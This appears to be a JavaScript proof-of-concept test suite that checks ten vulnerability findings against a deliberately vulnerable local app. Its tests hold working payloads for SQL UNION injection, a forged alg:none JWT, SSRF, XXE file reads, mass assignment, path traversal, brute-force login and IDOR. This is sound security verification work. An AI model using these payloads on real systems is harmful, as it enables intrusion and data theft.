/**
 * VAPT PoC suite — proves each of the 10 findings is REAL on the /vuln surface.
 * Run: npm run test:vapt
 * Each test corresponds to a finding V-01..V-10 in vapt/vapt-report.md.
 */
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import request from 'supertest';
import { buildApp } from '../src/app.js';
import { verifyVulnerable } from '../src/lib/jwt.js';
import { logSink, clearLogSink } from '../src/lib/logger.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
let app;
let internalServer;
let internalPort;

before(async () => {
  app = await buildApp();
  // Stand up a fake "internal service" to prove SSRF reaches it.
  internalServer = http.createServer((_req, res) => res.end('INTERNAL-METADATA-CREDENTIALS'));
  await new Promise((r) => internalServer.listen(0, '127.0.0.1', r));
  internalPort = internalServer.address().port;
});

after(() => internalServer && internalServer.close());

test('V-01 SQLi: UNION extracts api_secret from another table', async () => {
  // id=1 legitimately returns one row; the injection returns the crown-jewel secret.
  const payload = "0 UNION SELECT id, api_secret, role FROM users--";
  const res = await request(app).get('/vuln/items').query({ id: payload });
  assert.equal(res.status, 200);
  const flat = JSON.stringify(res.body.result);
  assert.match(flat, /SECRET_ADMIN_deadbeef/, 'exfiltrated admin api_secret via UNION');
});

test('V-02 JWT alg:none: forged admin token is accepted', async () => {
  const b64 = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');
  const forged = `${b64({ alg: 'none', typ: 'JWT' })}.${b64({ sub: 'attacker', role: 'admin' })}.`;
  // sanity: the vulnerable verifier accepts it
  assert.equal(verifyVulnerable(forged).role, 'admin');
  const res = await request(app).get('/vuln/account').set('Authorization', `Bearer ${forged}`);
  assert.equal(res.status, 200);
  assert.equal(res.body.role, 'admin');
});

test('V-03 SSRF: server fetches an internal, non-allowlisted address', async () => {
  const res = await request(app)
    .get('/vuln/fetch')
    .query({ url: `http://127.0.0.1:${internalPort}/` });
  assert.equal(res.status, 200);
  assert.match(res.body.body, /INTERNAL-METADATA-CREDENTIALS/);
});

test('V-04 XXE: external SYSTEM entity reads a local file', async () => {
  const secret = path.resolve(__dirname, '../data/secret.txt');
  const xml = `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file://${secret}">]><r>&xxe;</r>`;
  const res = await request(app).post('/vuln/xml').set('Content-Type', 'application/xml').send(xml);
  assert.equal(res.status, 200);
  assert.match(res.body.parsed, /TOP-SECRET-FLEETSEC-DATA/);
});

test('V-05 Mass Assignment: client escalates itself to admin', async () => {
  const res = await request(app)
    .post('/vuln/users')
    .send({ email: 'e@e.co', password: 'x', role: 'admin', isVerified: true });
  assert.equal(res.status, 201);
  assert.equal(res.body.created.role, 'admin', 'client-supplied role was trusted');
});

test('V-06 Path Traversal: ../ escapes the public directory', async () => {
  const res = await request(app).get('/vuln/download').query({ file: '../secret.txt' });
  assert.equal(res.status, 200);
  assert.match(res.text, /TOP-SECRET-FLEETSEC-DATA/);
});

test('V-07 Missing Rate Limiting: 50 rapid logins, none throttled', async () => {
  let throttled = 0;
  for (let i = 0; i < 50; i++) {
    const res = await request(app).post('/vuln/login').send({ user: 'admin', pass: `guess${i}` });
    if (res.status === 429) throttled++;
  }
  assert.equal(throttled, 0, 'no 429 ever returned — brute force unrestricted');
});

test('V-08 PII in logs: cédula and email written in cleartext', async () => {
  clearLogSink();
  await request(app)
    .post('/vuln/register')
    .send({ email: 'victim@fleetsec.co', cedula: '1020304050', phone: '3001234567' });
  const logged = logSink.join('\n');
  assert.match(logged, /1020304050/, 'raw cédula reached the log sink');
  assert.match(logged, /victim@fleetsec\.co/, 'raw email reached the log sink');
});

test('V-09 IDOR: user reads another tenant order without authorization', async () => {
  // order 102 belongs to the admin tenant; no auth is required to read it.
  const res = await request(app).get('/vuln/orders/102');
  assert.equal(res.status, 200);
  assert.equal(res.body.vehicle_plate, 'GOV001');
});

test('V-10 Hardcoded Credentials: secret leaks via debug endpoint', async () => {
  const res = await request(app).get('/vuln/debug/config');
  assert.equal(res.status, 200);
  assert.match(res.body.dbPassword, /FleetSec_Pr0d_DB_2024!/);
});
